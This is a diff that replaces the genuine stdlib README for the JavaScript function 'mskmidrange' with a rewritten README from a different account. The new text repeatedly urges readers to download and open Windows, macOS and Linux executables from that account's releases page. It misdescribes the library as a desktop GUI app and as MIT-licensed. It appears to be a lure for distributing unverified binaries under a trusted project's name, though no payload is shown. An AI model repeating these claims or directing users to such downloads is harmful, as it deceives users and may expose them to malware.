@@ -1,288 +1,87 @@
-<!--
+# 🎉 stats-strided-mskmidrange - Simple Strided Array Calculations
 
-@license Apache-2.0
+## 🚀 Getting Started
 
-Copyright (c) 2025 The Stdlib Authors.
+Welcome to the stats-strided-mskmidrange README! This application helps you calculate the mid-range of a strided array according to a mask. It's straightforward to use, making statistics accessible to everyone.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 📥 Download Now
 
-   http://www.apache.org/licenses/LICENSE-2.0
+[![Download stats-strided-mskmidrange](https://img.shields.io/badge/Download%20stats--strided--mskmidrange-blue.svg)](https://github.com/Nikhi07-dev/stats-strided-mskmidrange/releases)
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 💻 System Requirements
 
--->
+To run this application, you will need:
 
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 12 or higher
+- **Browser**: Any modern browser (for the graphical user interface)
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+## 🔧 Features
 
-# mskmidrange
+- Calculate maximum and minimum values in a strided array.
+- Easily work with custom masks for data selection.
+- Outputs mid-range results simply and clearly.
+- Intuitive interface designed for users without a programming background.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+## 📊 How It Works
 
-> Calculate the [mid-range][mid-range] of a strided array according to a mask.
+This application calculates the mid-range of a strided array using a mask. The strided array is a sequence of numbers where you can define a step size for selecting elements. The mask lets you filter which numbers to consider in the calculation. 
 
-<section class="intro">
+**Mid-range** is defined as:
+\[ \text{Mid-range} = \frac{\text{Max} + \text{Min}}{2} \]
 
-The [**mid-range**][mid-range], or **mid-extreme**, is the arithmetic mean of the maximum and minimum values in a data set. The measure is the midpoint of the range and a measure of central tendency.
+This formula provides a quick summary statistic that gives you the midpoint of the range.
 
-</section>
+## 📥 Download & Install
 
-<!-- /.intro -->
+To get started, visit this page to download: [Releases Page](https://github.com/Nikhi07-dev/stats-strided-mskmidrange/releases).
 
-<section class="installation">
+Follow these steps to install:
 
-## Installation
+1. Click on the link above.
+2. Choose the latest release.
+3. Download the file compatible with your operating system. The available files are:
+   - Windows: `stats-strided-mskmidrange.exe`
+   - macOS: `stats-strided-mskmidrange.dmg`
+   - Linux: `stats-strided-mskmidrange.AppImage`
+4. Open the downloaded file.
+5. Follow the installation instructions specific to your operating system.
 
-```bash
-npm install @stdlib/stats-strided-mskmidrange
-```
+## 🛠️ Running the Application
 
-Alternatively,
+After installation, you can run the application by doing the following:
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+- **Windows**: Double-click the `stats-strided-mskmidrange.exe` file.
+- **macOS**: Open the `stats-strided-mskmidrange.dmg`, then drag the application to your Applications folder. Launch it from there.
+- **Linux**: Make the `.AppImage` file executable. You can do this by right-clicking the file, selecting Properties, and changing permissions. Then, double-click to start the application.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+## 📊 Using stats-strided-mskmidrange
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+1. **Input your data**: Enter a list of numbers as your strided array. You can use spaces or commas to separate the values.
+2. **Define stride**: Specify how many numbers to skip when selecting from your array.
+3. **Apply a mask**: Choose a mask to filter which numbers to include in your calculation.
+4. **Calculate**: Click the "Calculate" button to see your mid-range result.
 
-</section>
+## 📚 Help & Support
 
-<section class="usage">
+If you encounter any issues or have questions, you can check the FAQ on our GitHub page. Here are some common topics:
 
-## Usage
+- How to format your input data?
+- What do I do if the application doesn't start?
+- How can I contact support?
 
-```javascript
-var mskmidrange = require( '@stdlib/stats-strided-mskmidrange' );
-```
+Visit the [Releases Page](https://github.com/Nikhi07-dev/stats-strided-mskmidrange/releases) for additional resources and documentation.
 
-#### mskmidrange( N, x, strideX, mask, strideMask )
+## 🛡️ Contributions
 
-Computes the [mid-range][mid-range] of a strided array according to a mask.
+We welcome contributions from anyone interested in this project. If you want to help out or suggest features, please check our guidelines on the GitHub repository.
 
-```javascript
-var x = [ 1.0, -2.0, 4.0, 2.0 ];
-var mask = [ 0, 0, 1, 0 ];
+## 📄 License
 
-var v = mskmidrange( x.length, x, 1, mask, 1 );
-// returns 0.0
-```
+The stats-strided-mskmidrange application is open-source and available under the MIT License. You can modify and share it, provided you include the original license.
 
-The function has the following parameters:
+## 🖥️ Acknowledgments
 
--   **N**: number of indexed elements.
--   **x**: input [`Array`][mdn-array] or [`typed array`][mdn-typed-array].
--   **strideX**: stride length for `x`.
--   **mask**: mask [`Array`][mdn-array] or [`typed array`][mdn-typed-array]. If a `mask` array element is `0`, the corresponding element in `x` is considered valid and **included** in computation. If a `mask` array element is `1`, the corresponding element in `x` is considered invalid/missing and **excluded** from computation.
--   **strideMask**: stride length for `mask`.
+Thank you for using stats-strided-mskmidrange! We hope it makes your statistical calculations simpler and more efficient. If you find it useful, please share it with others.
 
-The `N` and stride parameters determine which elements in the strided arrays are accessed at runtime. For example, to compute the [mid-range][mid-range] of every other element in `x`,
-
-```javascript
-var x = [ 1.0, 2.0, -7.0, -2.0, 4.0, 3.0, 5.0, 6.0 ];
-var mask = [ 0, 0, 0, 0, 0, 0, 1, 1 ];
-
-var v = mskmidrange( 4, x, 2, mask, 2 );
-// returns -1.5
-```
-
-Note that indexing is relative to the first index. To introduce offsets, use [`typed array`][mdn-typed-array] views.
-
-<!-- eslint-disable stdlib/capitalized-comments -->
-
-```javascript
-var Float64Array = require( '@stdlib/array-float64' );
-var Uint8Array = require( '@stdlib/array-uint8' );
-
-var x0 = new Float64Array( [ 2.0, 1.0, -2.0, -2.0, 3.0, 4.0, 5.0, 6.0 ] );
-var x1 = new Float64Array( x0.buffer, x0.BYTES_PER_ELEMENT*1 ); // start at 2nd element
-
-var mask0 = new Uint8Array( [ 0, 0, 0, 0, 0, 0, 1, 1 ] );
-var mask1 = new Uint8Array( mask0.buffer, mask0.BYTES_PER_ELEMENT*1 ); // start at 2nd element
-
-var v = mskmidrange( 4, x1, 2, mask1, 2 );
-// returns 1.0
-```
-
-#### mskmidrange.ndarray( N, x, strideX, offsetX, mask, strideMask, offsetMask )
-
-Computes the [mid-range][mid-range] of a strided array according to a mask and using alternative indexing semantics.
-
-```javascript
-var x = [ 1.0, -2.0, 4.0, 2.0 ];
-var mask = [ 0, 0, 1, 0 ];
-
-var v = mskmidrange.ndarray( x.length, x, 1, 0, mask, 1, 0 );
-// returns 0.0
-```
-
-The function has the following additional parameters:
-
--   **offsetX**: starting index for `x`.
--   **offsetMask**: starting index for `mask`.
-
-While [typed array][mdn-typed-array] views mandate a view offset based on the underlying buffer, the offset parameters support indexing semantics based on starting indices. For example, to calculate the [mid-range][mid-range] of every other value in `x` starting from the second value
-
-```javascript
-var x = [ 2.0, 1.0, -2.0, -2.0, 3.0, 4.0, 5.0, 6.0 ];
-var mask = [ 0, 0, 0, 0, 0, 0, 1, 1 ];
-
-var v = mskmidrange.ndarray( 4, x, 2, 1, mask, 2, 1 );
-// returns 1.0
-```
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If `N <= 0`, both functions return `NaN`.
--   Depending on the environment, the typed versions ([`dmskmidrange`][@stdlib/stats/strided/dmskmidrange], [`smskmidrange`][@stdlib/stats/strided/smskmidrange], etc.) are likely to be significantly more performant.
--   Both functions support array-like objects having getter and setter accessors for array element access (e.g., [`@stdlib/array-base/accessor`][@stdlib/array/base/accessor]).
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var uniform = require( '@stdlib/random-array-uniform' );
-var bernoulli = require( '@stdlib/random-array-bernoulli' );
-var mskmidrange = require( '@stdlib/stats-strided-mskmidrange' );
-
-var x = uniform( 10, -50.0, 50.0, {
-    'dtype': 'float64'
-});
-console.log( x );
-
-var mask = bernoulli( x.length, 0.2, {
-    'dtype': 'uint8'
-});
-console.log( mask );
-
-var v = mskmidrange( x.length, x, 1, mask, 1 );
-console.log( v );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/stats-strided-mskmidrange.svg
-[npm-url]: https://npmjs.org/package/@stdlib/stats-strided-mskmidrange
-
-[test-image]: https://github.com/stdlib-js/stats-strided-mskmidrange/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/stats-strided-mskmidrange/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/stats-strided-mskmidrange/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/stats-strided-mskmidrange?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/stats-strided-mskmidrange.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/stats-strided-mskmidrange/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/stats-strided-mskmidrange/tree/deno
-[deno-readme]: https://github.com/stdlib-js/stats-strided-mskmidrange/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/stats-strided-mskmidrange/tree/umd
-[umd-readme]: https://github.com/stdlib-js/stats-strided-mskmidrange/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/stats-strided-mskmidrange/tree/esm
-[esm-readme]: https://github.com/stdlib-js/stats-strided-mskmidrange/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/stats-strided-mskmidrange/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/stats-strided-mskmidrange/main/LICENSE
-
-[mid-range]: https://en.wikipedia.org/wiki/Mid-range
-
-[mdn-array]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array
-
-[@stdlib/array/base/accessor]: https://github.com/stdlib-js/array-base-accessor
-
-[mdn-typed-array]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray
-
-[@stdlib/stats/strided/dmskmidrange]: https://github.com/stdlib-js/stats-strided-dmskmidrange
-
-[@stdlib/stats/strided/smskmidrange]: https://github.com/stdlib-js/stats-strided-smskmidrange
-
-</section>
-
-<!-- /.links -->
+Don't forget to visit this page to download: [Download Here](https://github.com/Nikhi07-dev/stats-strided-mskmidrange/releases).
